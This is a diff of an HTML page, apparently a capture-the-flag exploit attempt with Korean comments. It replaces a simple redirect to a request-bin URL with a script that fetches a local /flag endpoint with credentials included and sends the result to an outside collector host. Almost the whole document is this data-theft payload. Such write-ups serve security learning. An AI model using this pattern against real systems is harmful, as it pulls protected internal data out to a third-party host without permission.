@@ -4,7 +4,23 @@
 <body>
   <h1>제발되라 기원 3트</h1>
  <script>
-location.href="https://ubawmcw.request.dreamhack.games?flag="+'hello'
+async function getFlagAndSend() {
+  // ① 플래그 읽기: /flag 로 바로 가도 되고, /go → 302 → /flag 여도 자동으로 따라감
+  const flagURL = 'http://127.0.0.1:8001/flag';   // 또는 http://127.0.0.1:9090/go
+  const res = await fetch(flagURL, {
+    redirect: 'follow',        // 기본값이 follow
+    cache: 'no-store',
+    credentials: 'include'     // 같은 오리진이면 쿠키 전송
+  });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  const text = (await res.text()).trim();  // ← 여기서 문자열로 확보
+
+  // ② 확보한 문자열을 다른 서버로 전송(이후 페이지 이동)
+  const sink = 'https://example-collector.test/?flag=' + encodeURIComponent(text);
+  location.href = sink;  // 또는 fetch(sink, {method:'POST', body: new URLSearchParams({flag:text})})
+}
+
+getFlagAndSend().catch(console.error);
 </script>
 
 </body>
